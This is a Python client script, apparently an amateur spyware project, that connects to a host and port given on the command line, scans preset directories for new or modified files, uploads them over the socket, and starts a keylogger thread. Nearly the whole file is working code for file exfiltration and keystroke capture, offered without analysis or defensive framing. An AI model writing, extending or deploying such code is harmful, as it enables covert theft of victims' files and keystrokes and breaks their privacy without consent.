#! python
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 17 19:56:16 2020

@author: 劉又聖
"""

import socket, sys, os, logging, platform, time
import threading as th
from keylogger import keylogger
from networkAPI import NetAPI
from config import *

#TODO 寫個check file routine
def scan_dir_and_cktime(dir_path):
    def scan_dir(dir_path):
        if 'update_dict' not in dir(scan_dir):
            scan_dir.update_dict = {}
            
        """ Scan the directory recursively """
        if os.path.exists(dir_path):
            if os.path.isdir(dir_path):
                for filename in os.listdir(dir_path):
                    fullpath = os.path.join(dir_path, filename)
                    scan_dir(fullpath)
            else:
                # Here dir_path is full path file name
                scan_dir.update_dict[dir_path] = [ os.path.getsize(dir_path),
                                                   os.path.getmtime(dir_path) ]
            
        return scan_dir.update_dict
    """ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ """
    ###################
    # Error Detection #
    ###################
    import json
    
    first_flag = False
    previous_file = 'previous.json'
    if not os.path.exists(previous_file):
        first_flag = True
    
    file_status = scan_dir(dir_path)
    update_list = {}
    if first_flag:
        # 第一次掃描目錄，需要建立 previous status file
        logging.debug('First, create previous status file.')
        update_list = file_status.copy()
    else:
        # 非第一次，讀取之前的資料
        pre_file_status = json.load(open(previous_file, 'r'))
        
        for fn, st in file_status.items():
            if not pre_file_status.get(fn):
                logging.debug('Come up an new file: {}'.format(fn))
                update_list[fn] = st  # 出現新檔案
            else:
                if pre_file_status[fn] != file_status[fn]:
                    logging.debug('File has been modify: {}'.format(fn))
                    update_list[fn] = st  # 檔案資料有變動

    # Save file status
    if first_flag:
        logging.debug('First save JSON file.')
        json.dump(file_status, open(previous_file, 'w'))
    else:
        for update_fn in update_list.keys():
            # Update the previous file status
            pre_file_status[update_fn] = update_list[update_fn]
        json.dump(pre_file_status, open(previous_file, 'w'))
        
    return update_list

def send_dir(handle, dir_paths):
    if isinstance(dir_paths, (list, tuple)):
        for dir_path in dir_paths:
            for file in scan_dir_and_cktime(dir_path).keys():
                handle.send_file(file)
    elif isinstance(dir_paths, str):
        pass
    return None

def client(host, port):
    start_dirs = upload_dirs.get(platform.system(), [])
    save_local_dirs  = client_save_dirs.get(platform.system(), [])
    
    logging.debug('Upload dirs {}'.format(start_dirs))
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect( (host, port) )

    handle = NetAPI(sock)
    #handle.send_file('server.py')
    
    # Create thread
    threads          = []
    send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
                                 args=(handle, start_dirs,))
    keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
                                 args=(save_local_dirs,), daemon=True)
    
    #TODO: Daily check dir & send them
    send_dir(handle, start_dirs)
    send_thread.start()
    threads.append(send_thread)
    #TODO: Run keylogger
    keylogger_thread.start()
    threads.append(keylogger_thread)
    
    #for thread in threads:
    #    thread.join()
    
    time.sleep(0.1)
    input('Debug input to end the progrm> ')
    sock.close()
    logging.debug('Client End')
    return None
    
def main():
    msg = "Usage: %s host port" % sys.argv[0]
    if len(sys.argv) != 3:
        print(msg)
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        client(host, port)

if __name__ == "__main__":
    main()